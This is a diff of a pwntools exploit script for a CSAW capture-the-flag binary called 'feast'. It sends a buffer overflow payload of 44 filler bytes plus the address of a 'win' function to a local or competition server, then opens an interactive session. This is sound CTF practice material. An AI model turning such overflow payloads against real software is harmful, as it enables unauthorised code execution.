@@ -2,14 +2,26 @@
 
 from pwn import *
 
-local = TRUE
-
+local = True
+debug = False
 if local:
-    p = remote('localhost', 8000)
+    if debug:
+        p = gdb.debug('./feast_docker',
+            '''
+            break *0x08048606
+            continue
+            ''')
+    else:
+        #p = process('./feast')
+        p = remote('localhost', 8000)
 else:
     p = remote('pwn.chal.csaw.io', 1002)
 
-e = ELF('./safespace')
+e = ELF('./feast')
+#print("win is at " + hex(e.sym['winner_winner_chicken_dinner']))
 
-p.recvline()
-p.sendline('A' * 32 + p64(e.sym['winner_winner_chicken_dinner']))
+p.recvuntil("> ")
+payload = 'A' * 44 + p32(e.sym['winner_winner_chicken_dinner'])
+
+p.send(payload + "\n")
+p.interactive()
